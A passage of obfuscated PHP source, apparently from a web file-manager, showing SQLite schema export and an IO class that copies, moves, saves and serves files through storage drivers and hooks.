$¯¯³ëŞ[$§ßØ–ï’[$¡ø‡Ÿµã[1106]]][$¡ø‡Ÿµã[1109]][] = $§ßØ–ï’[$¡ø‡Ÿµã[1108]]; continue; } $¯¯³ëŞ[$§ßØ–ï’[$¡ø‡Ÿµã[1106]]] = array($¡ø‡Ÿµã[1110] => $§ßØ–ï’[$¡ø‡Ÿµã[1106]], $¡ø‡Ÿµã[1109] => array($§ßØ–ï’[$¡ø‡Ÿµã[1108]]), $¡ø‡Ÿµã[1111] => $§ßØ–ï’[$¡ø‡Ÿµã[1112]] == $¡ø‡Ÿµã[88] ? 0 : 1); } $Ë ¬â‡• = array(); foreach ($¯¯³ëŞ as $§ßØ–ï’) { $–Û–Å¼ı = $§ßØ–ï’[$¡ø‡Ÿµã[1110]] == $¡ø‡Ÿµã[1107]; $Ô˜—¨È° = array($¡ø‡Ÿµã[1113], $§ßØ–ï’[$¡ø‡Ÿµã[1111]] == $¡ø‡Ÿµã[88] && !$–Û–Å¼ı ? $¡ø‡Ÿµã[1114] : $¡ø‡Ÿµã[12], $¡ø‡Ÿµã[1115], $¡ø‡Ÿµã[1116] . $ĞïüìÚ . $¡ø‡Ÿµã[11] . ($–Û–Å¼ı ? $¡ø‡Ÿµã[1117] : $§ßØ–ï’[$¡ø‡Ÿµã[1110]]) . $¡ø‡Ÿµã[118], $¡ø‡Ÿµã[1118], $¡ø‡Ÿµã[118] . $ĞïüìÚ . $¡ø‡Ÿµã[118], $¡ø‡Ÿµã[1119] . implode($¡ø‡Ÿµã[1120], $§ßØ–ï’[$¡ø‡Ÿµã[1109]]) . $¡ø‡Ÿµã[1121]); $Ë ¬â‡•[] = implode($¡ø‡Ÿµã[53], $Ô˜—¨È°) . $¡ø‡Ÿµã[71]; } $†‡¬’ÜÔ = array(); $ŞŠŒÑÁÖ = array($¡ø‡Ÿµã[1122] => $¡ø‡Ÿµã[1123], $¡ø‡Ÿµã[1123] => $¡ø‡Ÿµã[1123], $¡ø‡Ÿµã[288] => $¡ø‡Ÿµã[315], $¡ø‡Ÿµã[287] => $¡ø‡Ÿµã[315]); foreach ($¦Ô—èŒÕ as $§ßØ–ï’) { $Ô˜—¨È° = array($¡ø‡Ÿµã[118] . $§ßØ–ï’[$¡ø‡Ÿµã[1124]] . $¡ø‡Ÿµã[118], isset($ŞŠŒÑÁÖ[$§ßØ–ï’[$¡ø‡Ÿµã[1125]]]) ? $ŞŠŒÑÁÖ[$§ßØ–ï’[$¡ø‡Ÿµã[1125]]] : $§ßØ–ï’[$¡ø‡Ÿµã[1126]], $§ßØ–ï’[$¡ø‡Ÿµã[1127]] == $¡ø‡Ÿµã[903] ? $¡ø‡Ÿµã[1128] : $¡ø‡Ÿµã[1129], $§ßØ–ï’[$¡ø‡Ÿµã[1124]] == $¸ÀäÚ¯Š ? $¡ø‡Ÿµã[1130] : $¡ø‡Ÿµã[12], $§ßØ–ï’[$¡ø‡Ÿµã[954]] ? strtoupper(str_replace($¡ø‡Ÿµã[11], $¡ø‡Ÿµã[12], $§ßØ–ï’[$¡ø‡Ÿµã[954]])) : $¡ø‡Ÿµã[12]); $†‡¬’ÜÔ[] = trim(implode($¡ø‡Ÿµã[53], $Ô˜—¨È°)); } $©»‡ù¾Ã = array($¡ø‡Ÿµã[1131] . $ĞïüìÚ . $¡ø‡Ÿµã[1132], $¡ø‡Ÿµã[1133] . $ĞïüìÚ . $¡ø‡Ÿµã[1134], implode($¡ø‡Ÿµã[50] . PHP_EOL, $†‡¬’ÜÔ), $¡ø‡Ÿµã[951]); $†½•ş˜ = implode(PHP_EOL, array_merge($©»‡ù¾Ã, $Ë ¬â‡•)); if ($°ˆèµåÅ && $°ˆèµåÅ == $¡ø‡Ÿµã[13]) { return $†½•ş˜; } $Ù•¯ê¬¬ = array($¡ø‡Ÿµã[805] => $±¨äÕÙ†, $¡ø‡Ÿµã[13] => $†½•ş˜); return $°ˆèµåÅ ? $Ù•¯ê¬¬[$°ˆèµåÅ] : $Ù•¯ê¬¬; } public function sqlFromSqlite($ÒÚ Œ©, $·Ìä—« = '') { $ÏÂÛæ½ç =& $_SERVER[ùÆÎÔ“Ñ]; $Éù£âÎá = $this->model()->db(); $çóëô‚» = "\120\x52\101\107\115\101\x20\124\x41\x42\114\105\x5f\111\x4e\106\x4f\40\50\x27{$ÒÚ Œ©}\x27\x29"; $¸†¨àï© = "\123\105\x4c\x45\103\124\x20\x2a\40\x46\x52\x4f\x4d\40\163\161\x6c\x69\x74\x65\x5f\155\141\x73\x74\145\x72\x20\127\x48\x45\x52\105\x20\x74\142\154\x5f\x6e\x61\x6d\x65\x20\x3d\40\x27{$ÒÚ Œ©}\47"; $¿É¿¨Ø– = $Éù£âÎá->query($çóëô‚»); if (empty($¿É¿¨Ø–)) { $Ñ½ÜŞ„ = array($ÏÂÛæ½ç[805] => $ÏÂÛæ½ç[12], $ÏÂÛæ½ç[13] => $ÏÂÛæ½ç[12]); return $·Ìä—« ? $Ñ½ÜŞ„[$·Ìä—«] : $Ñ½ÜŞ„; } $òÆĞóÃµ = $Éù£âÎá->query($¸†¨àï©); $òùí¾Üë = $ÏïÎüÛß = array(); foreach ($òÆĞóÃµ as $ë¤’É) { if ($ë¤’É[$ÏÂÛæ½ç[33]] == $ÏÂÛæ½ç[279]) { $òùí¾Üë[] = $ë¤’É[$ÏÂÛæ½ç[1135]]; } else { $ÏïÎüÛß[$ë¤’É[$ÏÂÛæ½ç[32]]] = $ë¤’É[$ÏÂÛæ½ç[1135]]; } } $şµİäÀÌ = array_merge(array($ÏÂÛæ½ç[1131] . $ÒÚ Œ© . $ÏÂÛæ½ç[118]), $òùí¾Üë, array_values($ÏïÎüÛß)); $şµİäÀÌ = implode($ÏÂÛæ½ç[71] . PHP_EOL, $şµİäÀÌ) . $ÏÂÛæ½ç[71]; if ($·Ìä—« && $·Ìä—« == $ÏÂÛæ½ç[13]) { return $şµİäÀÌ; } $ØƒÑ”Œ = array(); $ÆÎøÄÑ¶ = array($ÏÂÛæ½ç[1123] => $ÏÂÛæ½ç[1136], $ÏÂÛæ½ç[315] => $ÏÂÛæ½ç[1137]); $†ñø¶× = $ÏÂÛæ½ç[12]; foreach ($¿É¿¨Ø– as $ë¤’É) { if ($ë¤’É[$ÏÂÛæ½ç[57]] == $ÏÂÛæ½ç[88]) { $†ñø¶× = $ë¤’É[$ÏÂÛæ½ç[32]]; } $÷„óßöì = array($ÏÂÛæ½ç[385] . $ë¤’É[$ÏÂÛæ½ç[32]] . $ÏÂÛæ½ç[385], isset($ÆÎøÄÑ¶[$ë¤’É[$ÏÂÛæ½ç[33]]]) ? $ÆÎøÄÑ¶[$ë¤’É[$ÏÂÛæ½ç[33]]] : $ë¤’É[$ÏÂÛæ½ç[33]], $ë¤’É[$ÏÂÛæ½ç[35]] == $ÏÂÛæ½ç[88] ? $ÏÂÛæ½ç[1128] : $ÏÂÛæ½ç[1138] . $ë¤’É[$ÏÂÛæ½ç[56]], $ë¤’É[$ÏÂÛæ½ç[57]] == $ÏÂÛæ½ç[88] ? $ÏÂÛæ½ç[1139] : $ÏÂÛæ½ç[12]); $ØƒÑ”Œ[] = trim(implode($ÏÂÛæ½ç[53], $÷„óßöì)); } foreach ($ÏïÎüÛß as $Ç¸ˆç¦Ğ => $°±ğÇ“) { $Ì«ôŠ•î = str_replace($ÏÂÛæ½ç[1140] . $ÒÚ Œ© . $ÏÂÛæ½ç[11], $ÏÂÛæ½ç[12], $Ç¸ˆç¦Ğ); $»é¹‰õ = str_replace(array($ÏÂÛæ½ç[118], $ÏÂÛæ½ç[962]), $ÏÂÛæ½ç[385], substr($°±ğÇ“, stripos($°±ğÇ“, $ÏÂÛæ½ç[260]))); if ($Ì«ôŠ•î == $ÏÂÛæ½ç[1117]) { $¦ËæŠº  = $ÏÂÛæ½ç[1141] . $†ñø¶× . $ÏÂÛæ½ç[1142]; } else { $¦ËæŠº  = (stripos($Ì«ôŠ•î, $ÏÂÛæ½ç[11]) ? $ÏÂÛæ½ç[1143] : $ÏÂÛæ½ç[12]) . ($ÏÂÛæ½ç[1144] . $Ì«ôŠ•î . $ÏÂÛæ½ç[1145] . $»é¹‰õ); } $ØƒÑ”Œ[] = $¦ËæŠº ; } $Êê££ÍÈ = array($ÏÂÛæ½ç[1146] . $ÒÚ Œ© . $ÏÂÛæ½ç[1147], $ÏÂÛæ½ç[1148] . $ÒÚ Œ© . $ÏÂÛæ½ç[1149], implode($ÏÂÛæ½ç[50] . PHP_EOL, $ØƒÑ”Œ), $ÏÂÛæ½ç[1150]); $†Ñ‰‹‡è = implode(PHP_EOL, $Êê££ÍÈ); if ($·Ìä—« && $·Ìä—« == $ÏÂÛæ½ç[805]) { return $†Ñ‰‹‡è; } $Ñ½ÜŞ„ = array($ÏÂÛæ½ç[805] => $†Ñ‰‹‡è, $ÏÂÛæ½ç[13] => $şµİäÀÌ); return $·Ìä—« ? $Ñ½ÜŞ„[$·Ìä—«] : $Ñ½ÜŞ„; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÍˆÇ‹†å, $ú–—½³é) { $…ÃË…¬ =& $_SERVER[ùÆÎÔ“Ñ]; $ß›Î¯†ú = $ú–—½³é; $GLOBALS[$…ÃË…¬[1151]] = $…ÃË…¬[1152] . $ÍˆÇ‹†å; Hook::trigger($…ÃË…¬[1152] . $ÍˆÇ‹†å . $…ÃË…¬[1153], $ß›Î¯†ú); $ı™§˜÷± = self::driverMake($ú–—½³é[0]); if (!$ı™§˜÷±) { return !1; } if (method_exists($ı™§˜÷±, $ÍˆÇ‹†å)) { $Ù²÷‰‘ = @call_user_func_array(array($ı™§˜÷±, $ÍˆÇ‹†å), $ú–—½³é); } else { if (method_exists($ı™§˜÷±, $…ÃË…¬[1154])) { $Ù²÷‰‘ = @call_user_func_array(array($ı™§˜÷±, $ÍˆÇ‹†å), $ú–—½³é); } else { if (method_exists(self, $ÍˆÇ‹†å)) { $Ù²÷‰‘ = @call_user_func_array(array(self, $ÍˆÇ‹†å), $ú–—½³é); } else { $Ù²÷‰‘ = call_user_func_array(array(parent, $ÍˆÇ‹†å), $ú–—½³é); } } } Hook::trigger($…ÃË…¬[1152] . $ÍˆÇ‹†å . $…ÃË…¬[1155], $ß›Î¯†ú, $Ù²÷‰‘); return $Ù²÷‰‘; } public static function init($“ñ©ÂüÏ) { return self::driverMake($“ñ©ÂüÏ); } public static function copy($ ¥ËÇ²÷, $ÁƒäÓö, $àÙÇÎâ = false, $Ûğ¿»‹ı = false) { return self::copyMoveStart($ ¥ËÇ²÷, $ÁƒäÓö, $àÙÇÎâ, $_SERVER[ùÆÎÔ“Ñ][555], $Ûğ¿»‹ı); } public static function move($Õªœêá«, $…ÀŒâæü, $¤ÀÊµ‹ß = false, $³ï¯şÖú = false) { return self::copyMoveStart($Õªœêá«, $…ÀŒâæü, $¤ÀÊµ‹ß, $_SERVER[ùÆÎÔ“Ñ][557], $³ï¯şÖú); } private static function copyMoveStart($Õ¿ó‰ªï, $å‚¢’†ß, $ì×¢©˜, $ñ‰ê°×, $¸Œ’™•ë) { $Ï†¸Ê†à =& $_SERVER[ùÆÎÔ“Ñ]; $ƒ˜ûÌàŸ = array($Õ¿ó‰ªï, $å‚¢’†ß, $ì×¢©˜, $¸Œ’™•ë); Hook::trigger($Ï†¸Ê†à[1152] . $ñ‰ê°× . $Ï†¸Ê†à[1153], $ƒ˜ûÌàŸ); $áû¡•˜ = self::copyMove($Õ¿ó‰ªï, $å‚¢’†ß, $ì×¢©˜, $ñ‰ê°×, $¸Œ’™•ë); Hook::trigger($Ï†¸Ê†à[1152] . $ñ‰ê°× . $Ï†¸Ê†à[1155], $ƒ˜ûÌàŸ, $áû¡•˜); return $áû¡•˜; } public static function saveFile($ÓÁŒÌ¹§, $Ö«¢Î¼, $şÑÛèä™ = true) { $®ìœúĞï =& $_SERVER[ùÆÎÔ“Ñ]; $§€ëÈ° = self::info($Ö«¢Î¼); $„ç¦ÙØû = self::driverMake($ÓÁŒÌ¹§); $òŠíÔ¡» = self::driverMake($Ö«¢Î¼); $™¤ß÷âÄ = !1; if ($òŠíÔ¡»->pathParse[$®ìœúĞï[1156]]) { $™¤ß÷âÄ = $òŠíÔ¡»; $‚†¡Šú = $òŠíÔ¡»->pathParse[$®ìœúĞï[1156]]; $òŠíÔ¡» = self::driverMake($‚†¡Šú); } if ($„ç¦ÙØû->pathParse[$®ìœúĞï[1156]]) { $ùÂ‡øÕù = $„ç¦ÙØû->pathParse[$®ìœúĞï[1156]]; $„ç¦ÙØû = self::driverMake($ùÂ‡øÕù); } $Úç‚¼° = $òŠíÔ¡»->pathFather($Ö«¢Î¼); $¦—óøÆ¬ = !0; if (!$şÑÛèä™ && self::driverIsSame($„ç¦ÙØû, $òŠíÔ¡»)) { $¦—óøÆ¬ = !1; } $ÉÁĞÜÎÚ = self::copyFile($„ç¦ÙØû, $ÓÁŒÌ¹§, $òŠíÔ¡», $Úç‚¼°, $§€ëÈ°[$®ìœúĞï[32]], $¦—óøÆ¬); if ($™¤ß÷âÄ) { $ÉÁĞÜÎÚ = $™¤ß÷âÄ->getPathOuter($ÉÁĞÜÎÚ); } return $ÉÁĞÜÎÚ; } private static function copyMove($ã’é‘Ï, $ÑÙåÑ¹, $ë¤ˆÏ¤†, $ş„ïá, $ıÙŠ«Ã = false) { $Å íª¯ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ã’é‘Ï || $ã’é‘Ï == $Å íª¯[8] || !$ÑÙåÑ¹) { return !1; } ignore_timeout(); $ÒÀ¼ÒÊ° = self::driverMake($ã’é‘Ï); $¼áÆ±ÃÆ = self::driverMake($ÑÙåÑ¹); $¦ÎØÜ§Ö = $ş„ïá == $Å íª¯[557]; $­ÍšÕïŸ = !1; if ($¼áÆ±ÃÆ->pathParse[$Å íª¯[1156]]) { $­ÍšÕïŸ = $¼áÆ±ÃÆ; $ÑÙåÑ¹ = $¼áÆ±ÃÆ->pathParse[$Å íª¯[1156]]; $¼áÆ±ÃÆ = self::driverMake($ÑÙåÑ¹); } if ($ÒÀ¼ÒÊ°->pathParse[$Å íª¯[1156]]) { $ã’é‘Ï = $ÒÀ¼ÒÊ°->pathParse[$Å íª¯[1156]]; $ÒÀ¼ÒÊ° = self::driverMake($ã’é‘Ï); } self::check($ÒÀ¼ÒÊ°, $ã’é‘Ï, $¼áÆ±ÃÆ, $ÑÙåÑ¹); Hook::trigger($Å íª¯[1157], $ÒÀ¼ÒÊ°, $ã’é‘Ï, $¼áÆ±ÃÆ, $ÑÙåÑ¹); $¡ö°éÖà = self::driverIsSame($ÒÀ¼ÒÊ°, $¼áÆ±ÃÆ); if ($¡ö°éÖà) { if ($ş„ïá == $Å íª¯[557] && !method_exists($¼áÆ±ÃÆ, $Å íª¯[1158]) && trim($ÑÙåÑ¹, $Å íª¯[8]) == trim($¼áÆ±ÃÆ->pathFather($ã’é‘Ï), $Å íª¯[8])) { if ($ÒÀ¼ÒÊ°->pathThis($ã’é‘Ï) != $ıÙŠ«Ã && !$ÒÀ¼ÒÊ°->isTypeObject()) { return $ÒÀ¼ÒÊ°->rename($ã’é‘Ï, $ıÙŠ«Ã); } return $¼áÆ±ÃÆ->getPathOuter($ã’é‘Ï); } if (method_exists($¼áÆ±ÃÆ, $ş„ïá)) { return $¼áÆ±ÃÆ->{$ş„ïá}($ã’é‘Ï, $ÑÙåÑ¹, $ë¤ˆÏ¤†, $ıÙŠ«Ã); } } if ($¡ö°éÖà && $ş„ïá == $Å íª¯[557] && $¼áÆ±ÃÆ->getType() == $Å íª¯[106]) { $•è…Úí¬ = $¼áÆ±ÃÆ->movePath($ã’é‘Ï, $ÑÙåÑ¹, $ıÙŠ«Ã); if ($•è…Úí¬) { return $•è…Úí¬; } } $Úú—ÁüÇ = $ÒÀ¼ÒÊ°->isFile($ã’é‘Ï); if (!$Úú—ÁüÇ && $¼áÆ±ÃÆ->getType() == $Å íª¯[759] && $ÒÀ¼ÒÊ°->getType() == $Å íª¯[106]) { $•è…Úí¬ = $¼áÆ±ÃÆ->copyFolderFromIO($ÒÀ¼ÒÊ°, $ã’é‘Ï, $ÑÙåÑ¹, $ë¤ˆÏ¤†, $¦ÎØÜ§Ö, $ıÙŠ«Ã); } else { $•è…Úí¬ = self::copyPath($ÒÀ¼ÒÊ°, $ã’é‘Ï, $¼áÆ±ÃÆ, $ÑÙåÑ¹, $ë¤ˆÏ¤†, $¦ÎØÜ§Ö, $Úú—ÁüÇ, $ıÙŠ«Ã); } if ($•è…Úí¬ && $¦ÎØÜ§Ö) { $ÒÀ¼ÒÊ°->remove($ã’é‘Ï); } if ($­ÍšÕïŸ) { $•è…Úí¬ = $­ÍšÕïŸ->getPathOuter($•è…Úí¬); } return $•è…Úí¬; } private static function check($—ñ³ä‘Â, $©„íâ¶, $Û°ÓÎÙÂ, &$ùÇ‘÷Õı) { $Éªó¿ã =& $_SERVER[ùÆÎÔ“Ñ]; if (self::driverIsSame($—ñ³ä‘Â, $Û°ÓÎÙÂ) && $—ñ³ä‘Â->isFolder($©„íâ¶) && $—ñ³ä‘Â->isParentOf($©„íâ¶, $ùÇ‘÷Õı)) { show_json(LNG($Éªó¿ã[1159]), !1); } if (!$—ñ³ä‘Â->exist($©„íâ¶)) { show_json(LNG($Éªó¿ã[105]), !1); } } private static function copyPath($´ù‹Ú¡¬, $Ê±Ó¬ˆ®, $Ê“èßù™, $»ÓşéÂÇ, $°”ÎæšÑ, $Î°ÁÅ , $ƒˆÃ¿­¯, $›’¼¶ü› = false, $üÓ†õµ = true) { $ÏÜ–ÀÉà =& $_SERVER[ùÆÎÔ“Ñ]; $É²òñı = empty($›’¼¶ü›) && $›’¼¶ü› !== $ÏÜ–ÀÉà[197] ? $´ù‹Ú¡¬->pathThis($Ê±Ó¬ˆ®) : $›’¼¶ü›; if ($°”ÎæšÑ) { $Ğ† Ÿ‘Ä = $Ê“èßù™->fileNameExist($»ÓşéÂÇ, $É²òñı); $ÎìŸ¾Ç« = $É²òñı; $É²òñı = $Ê“èßù™->fileNameAuto($»ÓşéÂÇ, $É²òñı, $°”ÎæšÑ, !$ƒˆÃ¿­¯); if (!$Ğ† Ÿ‘Ä || $ÎìŸ¾Ç« != $É²òñı) { $°”ÎæšÑ = !1; } if ($üÓ†õµ && !$°”ÎæšÑ) { $Ê“èßù™->_data[$ÏÜ–ÀÉà[1160]] = !0; } } if ($ƒˆÃ¿­¯) { return self::copyFile($´ù‹Ú¡¬, $Ê±Ó¬ˆ®, $Ê“èßù™, $»ÓşéÂÇ, $É²òñı, $Î°ÁÅ ); } if ($°”ÎæšÑ == REPEAT_RENAME_FOLDER) { $°”ÎæšÑ = !1; } $Íâ•ıû³ = rtrim($»ÓşéÂÇ, $ÏÜ–ÀÉà[8]) . $ÏÜ–ÀÉà[8] . $É²òñı; $êê÷„¥ = $Ê“èßù™->mkdir($Ê“èßù™->getPath($Íâ•ıû³), $°”ÎæšÑ); $»ÓşéÂÇ = $Ê“èßù™->getPathInner($êê÷„¥); $µäøªÏØ = $´ù‹Ú¡¬->listPath($Ê±Ó¬ˆ®, !0); $µäøªÏØ = is_array($µäøªÏØ) ? $µäøªÏØ : array($ÏÜ–ÀÉà[83] => array(), $ÏÜ–ÀÉà[82] => array()); $™¨öú¡¡ = array_merge($µäøªÏØ[$ÏÜ–ÀÉà[83]], $µäøªÏØ[$ÏÜ–ÀÉà[82]]); foreach ($™¨öú¡¡ as $±¥˜ Ì) { $Ñâµğ£€ = $±¥˜ Ì[$ÏÜ–ÀÉà[33]] == $ÏÜ–ÀÉà[199]; $Ê±Ó¬ˆ® = $´ù‹Ú¡¬->getPathInner($±¥˜ Ì[$ÏÜ–ÀÉà[84]]); $ú­íöÊ• = self::copyPath($´ù‹Ú¡¬, $Ê±Ó¬ˆ®, $Ê“èßù™, $»ÓşéÂÇ, $°”ÎæšÑ, $Î°ÁÅ , $Ñâµğ£€, !1, !1); if (!$ú­íöÊ•) { IO::errorTips($ÏÜ–ÀÉà[1161] . $Ê±Ó¬ˆ® . $ÏÜ–ÀÉà[70] . $»ÓşéÂÇ); } } self::copyMoveKeepInfo($´ù‹Ú¡¬, $Ê±Ó¬ˆ®, $êê÷„¥); return $êê÷„¥; } private static function copyFile($ûÌÈÙ³”, $•€áàÊ, $Ğö„àÂÎ, $ÈëÖÂ…å, $ÈÈµûÊŸ, $øÓªÚœÑ) { $òè¼“ã‹ =& $_SERVER[ùÆÎÔ“Ñ]; $ÈëÖÂ…å = $Ğö„àÂÎ->getPath(rtrim($ÈëÖÂ…å, $òè¼“ã‹[8]) . $òè¼“ã‹[8] . $ÈÈµûÊŸ); $ô¡Å‚îà = $òè¼“ã‹[1162] . time() . rand_string(5); Hook::trigger($òè¼“ã‹[1163], $ûÌÈÙ³”, $•€áàÊ, $Ğö„àÂÎ, $ÈëÖÂ…å, $ÈÈµûÊŸ, $ô¡Å‚îà); if (self::driverIsSame($ûÌÈÙ³”, $Ğö„àÂÎ)) { if ($øÓªÚœÑ) { $·ö×Î‚ = $Ğö„àÂÎ->moveFile($•€áàÊ, $ÈëÖÂ…å); } else { $·ö×Î‚ = $Ğö„àÂÎ->copyFile($•€áàÊ, $ÈëÖÂ…å); } Hook::trigger($òè¼“ã‹[1164], $ûÌÈÙ³”, $•€áàÊ, $Ğö„àÂÎ, $ÈëÖÂ…å, $ÈÈµûÊŸ, $·ö×Î‚); self::copyMoveKeepInfo($ûÌÈÙ³”, $•€áàÊ, $·ö×Î‚); return $·ö×Î‚; } $èıøºùÎ = TEMP_FILES; if ($GLOBALS[$òè¼“ã‹[6]][$òè¼“ã‹[89]][$òè¼“ã‹[797]]) { $èıøºùÎ = $GLOBALS[$òè¼“ã‹[6]][$òè¼“ã‹[89]][$òè¼“ã‹[797]]; } $¡Ñ¯â  = $èıøºùÎ; mk_dir($¡Ñ¯â ); $àÜÎ„Õ = $¡Ñ¯â  . $ô¡Å‚îà; $¬ëŸ×ƒ = $àÜÎ„Õ; $àÜÎ„Õ = $ûÌÈÙ³”->download($•€áàÊ, $àÜÎ„Õ); $àÜÎ„Õ = $ûÌÈÙ³”->iconvApp($àÜÎ„Õ); if (substr($àÜÎ„Õ, strlen($èıøºùÎ)) == $èıøºùÎ) { $øÓªÚœÑ = !0; } $·ö×Î‚ = $Ğö„àÂÎ->upload($ÈëÖÂ…å, $àÜÎ„Õ, $øÓªÚœÑ); self::remove($¬ëŸ×ƒ); Hook::trigger($òè¼“ã‹[1164], $ûÌÈÙ³”, $•€áàÊ, $Ğö„àÂÎ, $ÈëÖÂ…å, $ÈÈµûÊŸ, $·ö×Î‚); self::copyMoveKeepInfo($ûÌÈÙ³”, $•€áàÊ, $·ö×Î‚); return $·ö×Î‚; } private static function copyMoveKeepInfo($ÆÂ‰·é™, $¤£„îÀˆ, $¿Ó¢Æ¬Ø) { if (!$¿Ó¢Æ¬Ø) { return; } $­¸ğ‘ƒ„ = $ÆÂ‰·é™->info($¤£„îÀˆ); if (!is_array($­¸ğ‘ƒ„)) { return; } IO::setModifyTime($¿Ó¢Æ¬Ø, $­¸ğ‘ƒ„[$_SERVER[ùÆÎÔ“Ñ][85]]); } public static function pathFather($Êğïé’) { $ÈÛÁé÷ˆ = IO::init($Êğïé’); $¿şñ§¢Ö = $ÈÛÁé÷ˆ->pathFather($ÈÛÁé÷ˆ->path); return $ÈÛÁé÷ˆ->getPathOuter($¿şñ§¢Ö); } public static function fileOut($Ãó„°õ¯, $‘ë”œ«€ = false, $šŞÛÕ¦ô = false, $ùä´ö¼× = '') { $åÊáÄ‚Ê = self::driverMake($Ãó„°õ¯); if ($åÊáÄ‚Ê->isFileOutServer()) { return $åÊáÄ‚Ê->fileOutServer($Ãó„°õ¯, $‘ë”œ«€, $šŞÛÕ¦ô, $ùä´ö¼×); } return $åÊáÄ‚Ê->fileOut($Ãó„°õ¯, $‘ë”œ«€, $šŞÛÕ¦ô, $ùä´ö¼×); } public static function fileOutImage($Š‹µ®©, $ó¤ŠÔè = 250) { $€§ÑÌı° = array(250, 600, 1200, 2000, 3000, 5000); for ($É‰êËÈ = 0; $É‰êËÈ < count($€§ÑÌı°); $É‰êËÈ++) { if ($É‰êËÈ == 0 && $ó¤ŠÔè <= $€§ÑÌı°[$É‰êËÈ]) { $ó¤ŠÔè = $€§ÑÌı°[$É‰êËÈ]; break; } else { if ($ó¤ŠÔè > $€§ÑÌı°[$É‰êËÈ - 1] && $ó¤ŠÔè <= $€§ÑÌı°[$É‰êËÈ]) { $ó¤ŠÔè = $€§ÑÌı°[$É‰êËÈ]; break; } else { if ($É‰êËÈ == count($€§ÑÌı°) - 1 && $ó¤ŠÔè > $€§ÑÌı°[$É‰êËÈ]) { $ó¤ŠÔè = $€§ÑÌı°[$É‰êËÈ]; break; } } } } $Ñë±»Å = self::driverMake($Š‹µ®©); if ($Ñë±»Å->isFileOutServer()) { return $Ñë±»Å->fileOutImageServer($Š‹µ®©, $ó¤ŠÔè); } return $Ñë±»Å->fileOutImage($Š‹µ®©, $ó¤ŠÔè); } private static function driverIsSame($¨óìä¥‰, $¯éø÷‘) { $¬ÜÂø¸Ä =& $_SERVER[ùÆÎÔ“Ñ]; $±´¹¦ÚÆ = $¨óìä¥‰->getType(); $â½§Ì­ = $¯éø÷‘->getType(); if ($±´¹¦ÚÆ != $â½§Ì­) { return !1; } if ($±´¹¦ÚÆ == $¬ÜÂø¸Ä[759]) { return !0; } if ($±´¹¦ÚÆ == $¬ÜÂø¸Ä[106]) { return !0; } if ($¨óìä¥‰->pathDriver == $¯éø÷‘->pathDriver) { return !0; } return !1; } public static function copyUpdate($³¬¾¿ˆ, $Ìôû×‹²) { $¡‰ºšµò =& $_SERVER[ùÆÎÔ“Ñ]; if (!IO::exist($³¬¾¿ˆ)) { return !1; } if (!IO::exist($Ìôû×‹²)) { IO::mkdir($Ìôû×‹²); } $ò÷ƒœó² = self::_listAll($³¬¾¿ˆ); $²ú±¢¬Ÿ = self::_listAll($Ìôû×‹²); $¯åëÊ = array(); $ÎˆŞ ¼Ë = array(); foreach ($ò÷ƒœó² as $½¡…ƒ©½ => $²ó‹Å»¤) { if (isset($²ú±¢¬Ÿ[$½¡…ƒ©½])) { if ($²ó‹Å»¤[$¡‰ºšµò[75]] == 1) { continue; } if ($²ú±¢¬Ÿ[$½¡…ƒ©½][$¡‰ºšµò[76]] == $²ó‹Å»¤[$¡‰ºšµò[76]]) { continue; } } if ($²ó‹Å»¤[$¡‰ºšµò[75]] == 1) { $ÎˆŞ ¼Ë[] = $Ìôû×‹² . $¡‰ºšµò[8] . $½¡…ƒ©½; continue; } $ÕŒÇµ = strstr(trim($½¡…ƒ©½, $¡‰ºšµò[8]), $¡‰ºšµò[8]) ? get_path_father($½¡…ƒ©½) : $¡‰ºšµò[12]; $¯åëÊ[] = array($¡‰ºšµò[1165] => $²ó‹Å»¤[$¡‰ºšµò[84]], $¡‰ºšµò[1166] => rtrim($Ìôû×‹², $¡‰ºšµò[8]) . $¡‰ºšµò[8] . $ÕŒÇµ, $¡‰ºšµò[1167] => $²ó‹Å»¤); } $é“Î“› = array($¡‰ºšµò[199] => $¯åëÊ, $¡‰ºšµò[75] => $ÎˆŞ ¼Ë); Hook::trigger($¡‰ºšµò[1168], $³¬¾¿ˆ, $Ìôû×‹², $é“Î“›); foreach ($ÎˆŞ ¼Ë as $²ó‹Å»¤) { IO::mkdir($²ó‹Å»¤); } foreach ($¯åëÊ as $²ó‹Å»¤) { IO::copy($²ó‹Å»¤[$¡‰ºšµò[1165]], $²ó‹Å»¤[$¡‰ºšµò[1166]], REPEAT_REPLACE); } } private static function _listAll($˜¢ä…ıû) { $ÑõÏàÂ‘ =& $_SERVER[ùÆÎÔ“Ñ]; $˜¢ä…ıû = KodIO::clear($˜¢ä…ıû); $×ÉÛ©éÇ = IO::listAll($˜¢ä…ıû); foreach ($×ÉÛ©éÇ as &$ïÆÕú±) { $²Öëä‡† = substr($ïÆÕú±[$ÑõÏàÂ‘[84]], strlen($˜¢ä…ıû)); $ïÆÕú±[$ÑõÏàÂ‘[1169]] = trim($²Öëä‡†, $ÑõÏàÂ‘[8]); } unset($ïÆÕú±); return array_to_keyvalue($×ÉÛ©éÇ, $ÑõÏàÂ‘[1169]); } public static function fileSubstr($‰î’¬€Ê, $øã£””™, $ŞÇ¬„é = false) { $Ç‡õ“ó =& $_SERVER[ùÆÎÔ“Ñ]; $§şÑ„Á = self::driverMake($‰î’¬€Ê); $óª€´¥Û = $§şÑ„Á->size($‰î’¬€Ê); $Á†­Ëšô = $øã£””™; $–Çô§öÃ = $ŞÇ¬„é; if ($øã£””™ < 0) { $øã£””™ = $óª€´¥Û + $øã£””™; } if ($ŞÇ¬„é === !1) { $ŞÇ¬„é = $óª€´¥Û - $øã£””™; } if ($øã£””™ + $ŞÇ¬„é > $óª€´¥Û) { $ŞÇ¬„é = $óª€´¥Û - $øã£””™; } if (!$óª€´¥Û && $§şÑ„Á->getType() == $Ç‡õ“ó[106] && !$§şÑ„Á->exist($‰î’¬€Ê)) { $ğü¶¬š = get_path_this($‰î’¬€Ê); $©Æ Ï¿’ = parse_url_query($ğü¶¬š); if (is_array($©Æ Ï¿’) && isset($©Æ Ï¿’[$Ç‡õ“ó[32]])) { $ğü¶¬š = urldecode($©Æ Ï¿’[$Ç‡õ“ó[32]]); } throw new Exception($Ç‡õ“ó[1170] . LNG($Ç‡õ“ó[1171]) . $Ç‡õ“ó[971] . clear_html($ğü¶¬š) . $Ç‡õ“ó[12]); } if ($ŞÇ¬„é <= 0) { return $Ç‡õ“ó[12]; } if ($øã£””™ < 0 || $øã£””™ >= $óª€´¥Û || 